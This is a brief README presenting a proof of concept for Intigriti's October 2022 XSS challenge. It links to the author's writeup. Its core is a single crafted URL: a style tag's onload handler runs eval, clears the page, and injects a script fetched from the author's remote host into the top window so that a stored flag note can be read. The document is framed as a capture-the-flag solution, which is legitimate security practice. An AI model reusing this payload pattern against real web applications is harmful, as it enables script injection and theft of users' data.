# POC for Intigriti's OCT XSS challenge

https://challenge-1022.intigriti.io

## Live

* open a new private window and create account with a note with flag, then navigate to

```
https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle/onload=eval(uri)%3E&first=yes%0Adocument.head.innerHTML=%27%27;document.body.innerHTML=%27%3Ciframe%20srcdoc=%22%3Cscript%3Ea=document.createElement(`script`);a.src=`https://inti.0xgodson.com/script.js`;top.window.document.head.append(a);%3C/script%3E%22%3E%27
```

My Writeup : https://blog.0xgodson.com/2022-10-14-intigriti-oct-xss-challenge-author-writeup/
